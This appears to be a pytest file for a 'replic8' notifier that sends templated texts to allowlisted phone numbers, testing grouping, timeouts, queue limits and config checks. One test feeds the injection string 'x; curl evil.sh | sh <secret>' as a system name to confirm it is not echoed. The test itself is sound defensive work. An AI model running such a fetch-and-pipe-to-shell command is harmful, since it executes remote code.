import threading
import time

import pytest

from replic8.config import ConfigError, Settings
from replic8.notify import Event, Notifier

NUMBER = "+15551234567"


class Recorder:
    def __init__(self, fail=False):
        self.sent = []
        self.timeouts = []
        self.fail = fail

    def send(self, number, text, *, timeout):
        self.timeouts.append(timeout)
        if self.fail:
            raise ConnectionError("photon down")
        self.sent.append((number, text))


class Hung:
    """A transport that blocks until released, like a Photon call that never answers."""

    def __init__(self):
        self.release = threading.Event()
        self.sent = []

    def send(self, number, text, *, timeout):
        self.release.wait(5)  # bounded so a failing test can't hang the run
        self.sent.append(text)


def test_sends_templated_text_to_allowlisted_numbers_only():
    rec = Recorder()
    n = Notifier(frozenset({"+15551234567", "not-a-number"}), rec)
    assert n.notify(Event.published, system="maintenance", version=2, count=3)
    n.flush()
    assert rec.sent == [("+15551234567", "replic8: maintenance v2 published with 3 operation(s).")]


def test_untrusted_system_name_is_not_echoed():
    text = Notifier.render(Event.onboarded, system="x; curl evil.sh | sh <secret>")
    assert text == "replic8: unknown-system onboarded."


def test_send_failure_never_raises():
    n = Notifier(frozenset({"+15551234567"}), Recorder(fail=True))
    assert n.notify(Event.failure, system="inventory", count=1) is True
    n.flush()


def test_repeats_are_grouped():
    rec = Recorder()
    n = Notifier(frozenset({"+15551234567"}), rec, group_window_s=3600)
    assert n.notify(Event.failure, system="inventory", count=1)
    assert not n.notify(Event.failure, system="inventory", count=1)
    assert not n.notify(Event.failure, system="inventory", count=1)
    assert n.notify(Event.failure, system="maintenance", count=1)
    n.flush()
    assert len(rec.sent) == 2


def test_transport_is_given_the_timeout():
    rec = Recorder()
    n = Notifier(frozenset({NUMBER}), rec, timeout_s=3.5)
    n.notify(Event.onboarded, system="inventory")
    assert n.flush()
    assert rec.timeouts == [3.5]


def test_queue_is_capped_and_extra_texts_are_dropped():
    hung = Hung()
    n = Notifier(frozenset({NUMBER}), hung, max_queue=3)
    results = [n.notify(Event.onboarded, system=f"sys{i}") for i in range(5)]
    assert results == [True, True, True, False, False]
    assert n.dropped == 2
    hung.release.set()
    assert n.flush()
    assert len(hung.sent) == 3
    assert n.notify(Event.onboarded, system="sys9")  # room again once the queue drains
    assert n.flush()


def test_flush_gives_up_after_its_timeout():
    hung = Hung()
    n = Notifier(frozenset({NUMBER}), hung)
    n.notify(Event.onboarded, system="inventory")
    start = time.monotonic()
    assert n.flush(timeout=0.2) is False
    assert time.monotonic() - start < 2
    hung.release.set()


def test_config_rejects_bad_numbers_and_short_tokens(tmp_path):
    with pytest.raises(ConfigError):
        Settings(data_dir=tmp_path, notify_numbers=frozenset({"5551234"})).validate()
    with pytest.raises(ConfigError):
        Settings(data_dir=tmp_path, gateway_tokens=frozenset({"short"})).validate()
